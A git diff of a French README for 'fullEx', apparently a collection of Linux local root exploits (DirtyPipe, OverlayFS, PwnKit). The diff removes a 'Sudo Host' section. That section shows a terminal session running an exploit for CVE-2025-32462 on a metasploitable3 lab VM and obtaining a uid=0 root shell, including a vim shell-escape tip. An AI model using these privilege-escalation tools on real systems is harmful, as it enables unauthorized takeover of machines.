@@ -5,8 +5,6 @@ Les exploits root & outils dispo :
 
 💀 DirtyPipe
 
-💀 Sudo Host
-
 💀 OverlayFS
 
 💀 PwnKit
@@ -45,23 +43,8 @@ Commands:
    -perm          Applique les droit d'execution '/fullEx'
    -help          Affiche les commandes
  ```
-# 💀 SudoHost
 
-```
-vagrant@metasploitable3-ub1404:~/fullEx$ bash fullEx.sh -perm
-vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -SudoHost
-[+] Sudo Host Bypass Exploit - CVE-2025-32462
-[+] Discovered by: Rich Mirch
-[+] Exploit by: J3rich0123
-[+] Target: Linux x86_64
-[+] Starting pseudo-root shell on dev.
-[+] Type 'exit' or 'quit' to leave.
-[+] For a real shell, type: bash
-[+] Or: vim → :!bash to break into a real TTY shell
-root@dev# bash -i
-root@metasploitable3-ub1404:~/fullEx# id
-uid=0(root) gid=0(root) groups=0(root)
-```
+
 # 💀 DirtyPipe
 
 ```
